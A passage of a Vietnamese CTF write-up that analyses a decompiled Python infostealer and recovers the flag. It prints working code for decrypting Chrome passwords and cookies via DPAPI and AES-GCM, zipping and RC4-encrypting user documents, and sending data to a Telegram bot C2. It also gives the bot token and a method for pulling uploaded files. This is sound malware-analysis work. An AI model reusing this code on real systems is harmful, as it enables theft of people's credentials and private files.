    buffer = ctypes.create_string_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
def Decrypt_DataUsingDPAPI(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return HandleMemory(blob_out)
    else:
        return None
```

- Hàm `HandleMemory` sẽ đóng vai trò là xử lý phần memory như đọc kích thước của phần dữ liệu decryption `cbData` và con trỏ đến vùng dữ liệu đó là `pbData`.
  - Sau đó thực hiện copy phần dữ liệu decryption từ `cbData` -> `buffer` (hành động này là thực hiện tạo ra 1 bộ đệm trong python `ctypes.create_string_buffer(cbData)` -> sau đó dùng hàm `memcpy` để copy phần cache đó từ memory Windows vào memory Python
  - Cuối cùng là gọi LocalFree để dọn dẹp bộ nhớ

- Hàm `Decrypt_DataUsingDPAPI` đầu tiên tính toán len của `encrypted_bytes - phần data sử dụng dpapi protected` và salt, sau đó chuyển nó thành C-Buffer để có thể làm việc với các hàm của Windows API. Ở đây chính là hàm `CryptUnprotectData` của thư viện `crypt32`
  - Hành động chính là thực hiện decrypt phần dữ liệu được bọc dpapi protected, sau đó chuyển lên cho hàm HandleMemory xử lý lưu trong cache của Python

Tiếp theo là Hàm thực hiện gọi ra phần giá trị bên trong Local State để decrypt:

```python
def zaDThEJSGQ(agrs):
    if not os.path.exists(agrs):
        return
    else:
        with open(agrs, 'r', encoding='utf-8') as f:
            VkDrfTFpNz = json.loads(f.read())
        CZHdMcABep = base64.b64decode(VkDrfTFpNz['os_crypt']['encrypted_key'])[5:]
        zsRDAolVcq = Decrypt_DataUsingDPAPI(CZHdMcABep)
        return zsRDAolVcq
```

Đây là hàm chính xác sử dụng để decrypt phần giá trị được bọc trong dpapi của Local State để thực hiện decrypt các data store bên trong các application của Chrominum như Cookie, Login Data,...

- Logic của hàm này là thực hiện load vào 1 giá trị từ tham số `agrs` sau đó encode nó dưới dạng utf-8 và đọc bằng hàm `json.load` + tìm các keyword (`os_crypt` & `encrypted_bytes`) sau đó decode base64 để lấy raw data -> Đây là hành động thực hiện lấy ra giá trị `extracted` được lưu bên trong Local State
- Sau đó lấy raw data đó thực hiện decrypt bằng hàm `Decrypt_DataUsingDPAPI()` -> Chính là dùng để lấy ra key AES-256-GCM được bọc bằng Windows DPAPI Key
- Sau đó trả về giá trị key đó

Hàm tiếp theo chính là hàm thực hiện decrypt các credentials của Chrominum đã trích xuất được từ file system của victim:

```python
def decrypt(Buffer, master_key=None):
    starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = Buffer[3:15]
        payload = Buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)]
        try:
            decrypted_pass = decrypted_pass.decode()
        except Exception as e:
            pass
        return decrypted_pass
    else:
        return None
```

Sau khi có được các file credentials như cookie, login data, nó sẽ thực hiện load vào tham số `buffer` rồi thực hiện check signature của file credentials này ở version `v10` hay `v11`:

-> Rồi bắt đầu trích xuất iv và payload
-> Dùng key AES_256_GCM được trích xuất từ hàm trên để decrypt credential.


Tiếp theo là hàm thực hiện decrypt-encrypt RC4
```python
def MakeString(khIKRYXpQF):
    LxYmNMbCqy = len(khIKRYXpQF)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + khIKRYXpQF[i % LxYmNMbCqy]) % 256
        S[i], S[j] = (S[j], S[i])
    return S
def genKey(S, uNvoSEMwJe):
    i = j = 0
    out = []
    for char in uNvoSEMwJe:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = (S[j], S[i])
        K = S[(S[i] + S[j]) % 256]
        out.append(char ^ K)
    return bytes(out)
def RC4(hfjgkeejkfo, dfEWQ):
    hfjgkeejkfo = [ord(c) for c in hfjgkeejkfo]
    S = MakeString(hfjgkeejkfo)
    return genKey(S, dfEWQ)
def Decrypt_RC4(uNvoSEMwJe, VSeWtElMYr, hfjgkeejkfo):
    # irreducible cflow, using cdg fallback
    # ***<module>.CXPkycmTAa: Failure: Compilation Error
    with open(uNvoSEMwJe, 'rb') as inp:
        dfEWQ = inp.read()
    AAA = RC4(hfjgkeejkfo, dfEWQ)
    with open(VSeWtElMYr, 'wb') as out:
        out.write(AAA)

    except Exception as e:
        print(f'Error: {e}')
    return 0
```

Sau đó là các hàm lấy ra các credentials của Chrome, discord, rồi bắt đầu thực hiện decrypt các giá trị được bảo vệ bằng key bọc bằng dpapi Windows. Một số hàm như:
- GetCredentialsChrome()
- GetCookiesChrome()
- GetHistoryChrome()
- GetTokensDiscord()

Tiếp theo là hàm thực hiện lấy địa chỉ Ip của victim:

```
def nyCidxJVDf() -> str:
    OonWMrLQeJ = 'https://api.ipify.org?format=json'
    YgyvzXclqs = requests.get(OonWMrLQeJ)
    YgyvzXclqs.raise_for_status()
    data = YgyvzXclqs.json()
    return data['ip']
```

Sau đó là hàm thực hiện gom ra các file nằm trong các thư mục của user như `Download`, `Document`, `Pictures`:

```python
def seDJkcNSgB() -> str:
    eByYHhUZxQ = ['.png', '.pdf', '.jpg', '.docx', '.xlsx', '.xls', '.doc', '.pptx', '.csv', '.rtf', '.jpeg', '.html', '.odt', '.sql', '.txt', '.xml', '.zip', '.rar', '.7z', '.tar', '.gz', '.tgz']
    DESQkmwuvU = os.environ['USERPROFILE']
    iYzqnXvICP = [os.path.join(DESQkmwuvU, 'Documents'), os.path.join(DESQkmwuvU, 'Pictures'), os.path.join(DESQkmwuvU, 'Downloads')]
    fGveRzydAE = []
    for i in iYzqnXvICP:
        if not os.path.exists(i):
            continue
        else:
            for root, _, iKBAcWFZkt in os.walk(i):
                for JWoPjhAzOI in iKBAcWFZkt:
                    if any((JWoPjhAzOI.endswith(ext) for ext in eByYHhUZxQ)):
                        fGveRzydAE.append(os.path.join(root, JWoPjhAzOI))
    PrhjiaXUYA = os.path.join(iYzqnXvICP[1], 'Data.zip')
    try:
        with zipfile.ZipFile(PrhjiaXUYA, 'w') as zipf:
            for SlwNYcXGvg in fGveRzydAE[:100]:
                try:
                    zipf.write(SlwNYcXGvg, os.path.relpath(SlwNYcXGvg, DESQkmwuvU))
                except:
                    pass
        Decrypt_RC4(f'{PrhjiaXUYA}', f'{PrhjiaXUYA}', f'{nyCidxJVDf()}')
    except Exception as e:
        return 0
    return PrhjiaXUYA
```

Hàm này thực hiện gom ra các file nằm trong folder `Download`, `Document`, `Pictures` sau đó gom nó lại thành 1 file zip, sau đó sử dụng hàm `Decrypt_RC4()` để mã hóa nó bằng key chính là địa chỉ ip của victim

Các hàm cuối cùng chính là các hàm dùng để attacker thực hiện giao tiếp với C2 server của mình là bot telegram:

```python
def TelegramServerC2(file_path, token, chat_id):
    # irreducible cflow, using cdg fallback
    # ***<module>.QAhgBNghdyus: Failure: Compilation Error
    url = f'https://api.telegmram.org/bot{token}/sendDocuent'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id, 'protect_content': True}
        response = requests.post(url, files=files, data=data)
        return response.json()
    except Exception as e:
        print(f'Error: {e}')
        return None
def sendTelegram(message, token, chat_id):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message, 'protect_content': True}
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f'Error: {e}')
        return None
def CredentialsUpload() -> str:
    try:
        dtg = nyCidxJVDf()
        geo_url = f'http://ip-api.com/json/{dtg}'
        geo_response = requests.get(geo_url)
        geo_data = geo_response.json()
        fgh = os.getlogin()
        rty = geo_data.get('country', 'Unknown')
        region = geo_data.get('region', 'Unknown')
        city = geo_data.get('city', 'Unknown')
        ewr = geo_data.get('isp', 'Unknown')
        LOphdjsuytrenh = f"\n🖥️ **11223334445566**\n\n👤 11: `{fgh}`\n🌐 1212: `{dtg}`\n📍 1314: `{rty} ({region}, {city})`\n📡 1214: `{ewr}`\n💻 1211: `{os.getenv('COMPUTERNAME')}`\n⚙️ 12 124: `{os.cpu_count()}`\n🏠 1233 678: `{os.getenv('USERPROFILE')}`\n🔧 1234 567: `{os.getenv('PROCESSOR_IDENTIFIER')}`\n"
        return LOphdjsuytrenh
    except Exception as e:
        return 'Error'
```

Ngoài ra bên trong source code của hàm main còn có đính hardcode token và chat_id của bot telegram nên mình sẽ có thể thực hiện dump về phần history chat của telegram để lấy các file đã được up lên server C2

- Token: 8698629716:AAHYMShQ4fkNv5r3vEqaKh-lcXhWpujT82M
- Chat_ID: 7870990883

Giờ mình thực hiện 1 method lên bot telegram thử:

<img width="1919" height="324" alt="image" src="https://github.com/user-attachments/assets/adfd6eba-b16a-47ad-ae09-facece4cea35" />

Có trả về response tức là request của mình có thể thực hiện được:

<img width="1419" height="904" alt="image" src="https://github.com/user-attachments/assets/20947f24-22bc-473c-b19b-ab61630bb052" />

Đây là các file mà con infostealer đã thực hiện upload lên cho server, mà mình dùng method forwardMessage để yêu cầu nó chuyển tiếp tin nhắn về đoạn chat của mình. Trong url mình sử dụng là:

```
https://api.telegram.org/bot{TOKEN}/forwardMessage?chat_id={YOUR_CHAT_ID}&from_chat_id={TARGET_CHAT_ID}&message_id={msg_id}
```

Từng fields bên trong là:

- method mình sử dụng là forwardMessage dùng để chuyển tiến phần tin nhắn
- chat_id là chat_id của mình với con bot telegram
- from chat id: là từ chat_id của attacker được hardcode bên trong với bot tele
- message_id: là từng id của tin nhắn được gửi từ cả 2 - (user và bot tele)

Sau đó mình tải file `data.zip` về và thực hiện decrypt bằng key là địa chỉ ip của victim: `171.250.163.13` bằng thuật toán RC4:

<img width="1537" height="937" alt="image" src="https://github.com/user-attachments/assets/8628b267-29dd-4912-804a-4c2511c98320" />

Sau đó thực hiện tải xuống và check từng file bên trong mình sẽ có được flag:

<img width="1797" height="1035" alt="image" src="https://github.com/user-attachments/assets/4c801040-a238-4501-839a-ca45e9dc85cd" />

**flag: KMACTF{1_L1K3_H3R}**
